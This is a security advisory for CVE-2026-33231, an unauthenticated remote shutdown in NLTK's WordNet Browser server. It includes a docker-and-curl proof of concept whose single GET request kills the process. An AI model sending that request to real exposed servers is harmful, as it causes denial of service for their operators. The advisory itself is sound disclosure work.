# [H] Unauthenticated remote shutdown in nltk.app.wordnet_app

## Summary
Severity: High
Advisory: GHSA-jm6w-m3j8-898g
CVE: CVE-2026-33231
CWE: CWE-306
Ecosystem: PyPI
CVSS: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H (CVSS_V3)
Published: 2026-03-19
Source: https://github.com/advisories/GHSA-jm6w-m3j8-898g
Type: github-advisory

## Affected
- PyPI: `nltk` — affected >=0 <3.9.4

## Details
### Summary
`nltk.app.wordnet_app` allows unauthenticated remote shutdown of the local WordNet Browser HTTP server when it is started in its default mode. A simple `GET /SHUTDOWN%20THE%20SERVER` request causes the process to terminate immediately via `os._exit(0)`, resulting in a denial of service.

### Details
The vulnerable logic is in `nltk/app/wordnet_app.py`:

- [`nltk/app/wordnet_app.py:242`](/mnt/Data/my_brains/test/nltk/nltk/app/wordnet_app.py#L242)
  - The server listens on all interfaces:
  - `server = HTTPServer(("", port), MyServerHandler)`

- [`nltk/app/wordnet_app.py:87`](/mnt/Data/my_brains/test/nltk/nltk/app/wordnet_app.py#L87)
  - Incoming requests are checked for the exact path:
  - `if unquote_plus(sp) == "SHUTDOWN THE SERVER":`

- [`nltk/app/wordnet_app.py:88`](/mnt/Data/my_brains/test/nltk/nltk/app/wordnet_app.py#L88)
  - The shutdown protection only depends on `server_mode`

- [`nltk/app/wordnet_app.py:93`](/mnt/Data/my_brains/test/nltk/nltk/app/wordnet_app.py#L93)
  - In the default mode (`runBrowser=True`, therefore `server_mode=False`), the handler terminates the process directly:
  - `os._exit(0)`

This means any party that can reach the listening port can stop the service with a single unauthenticated GET request when the browser is started in its normal mode.

### PoC
1. Start the WordNet Browser in Docker in its default mode:

```bash
docker run -d --name nltk-wordnet-web-default-retest -p 8004:8004 \
  nltk-sandbox \
  python -c "import nltk; nltk.download('wordnet', quiet=True); from nltk.app.wordnet_app import wnb; wnb(8004, True)"
```

2. Confirm the service is reachable:

```bash
curl -s -o /tmp/wn_before.html -w '%{http_code}\n' 'http://127.0.0.1:8004/'
```

Observed result:

```text
200
```

3. Trigger shutdown:

```bash
curl -s -o /tmp/wn_shutdown.html -w '%{http_code}\n' 'http://127.0.0.1:8004/SHUTDOWN%20THE%20SERVER'
```

Observed result:

```text
000
```

4. Verify the service is no longer available:

```bash
curl -s -o /tmp/wn_after.html -w '%{http_code}\n' 'http://127.0.0.1:8004/'
docker ps -a --filter name=nltk-wordnet-web-default-retest --format '{{.Names}}\t{{.Status}}'
docker logs nltk-wordnet-web-default-retest
```

Observed results:

```text
000
nltk-wordnet-web-default-retest    Exited (0)
Server shutting down!
```

### Impact
This is an unauthenticated denial-of-service issue in the NLTK WordNet Browser HTTP server.

Any reachable client can terminate the service remotely when the application is started in its default mode. The impact is limited to service availability, but it is still security-relevant because:

- the route is accessible over HTTP
- no authentication or CSRF-style confirmation is required
- the server listens on all interfaces by default
- the process exits immediately instead of performing a controlled shutdown

This primarily affects users who run `nltk.app.wordnet_app` and expose or otherwise allow access to its listening port.

## References
- https://github.com/nltk/nltk/security/advisories/GHSA-jm6w-m3j8-898g
- https://nvd.nist.gov/vuln/detail/CVE-2026-33231
- https://github.com/nltk/nltk/commit/bbaae83db86a0f49e00f5b0db44a7254c268de9b
- https://github.com/nltk/nltk
